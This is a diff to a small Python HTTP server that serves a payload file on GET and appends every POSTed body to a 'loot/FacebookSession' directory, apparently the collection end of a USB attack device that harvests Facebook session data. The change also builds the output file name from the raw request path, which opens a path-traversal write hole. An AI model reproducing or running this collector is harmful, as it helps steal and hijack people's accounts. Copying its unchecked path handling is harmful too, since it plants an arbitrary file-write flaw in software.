@@ -3,10 +3,9 @@ from os import curdir
 from os.path import join as pjoin
 
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
-# from http.server import BaseHTTPRequestHandler, HTTPServer
 
 class StoreHandler(BaseHTTPRequestHandler):
-    store_path = pjoin("/root/udisk/loot/FacebookSession/", 'l')
+    store_path = "/root/udisk/loot/FacebookSession"
     get_path = pjoin(curdir, 'p')
 
     def do_GET(self):
@@ -18,16 +17,14 @@ class StoreHandler(BaseHTTPRequestHandler):
                 self.wfile.write(fh.read().encode())
 
     def do_POST(self):
-        if self.path == '/l':
-            length = self.headers['content-length']
-            data = self.rfile.read(int(length))
+        length = self.headers['content-length']
+        data = self.rfile.read(int(length))
 
-            with open(self.store_path, 'a') as fh:
-                fh.write(data.decode() + "\n")
+        with open(self.store_path + self.path, 'a') as fh:
+            fh.write(data.decode() + "\n")
 
-            self.send_response(200)
+        self.send_response(200)
 
 
 server = HTTPServer(('', 8080), StoreHandler)
 server.serve_forever()
-
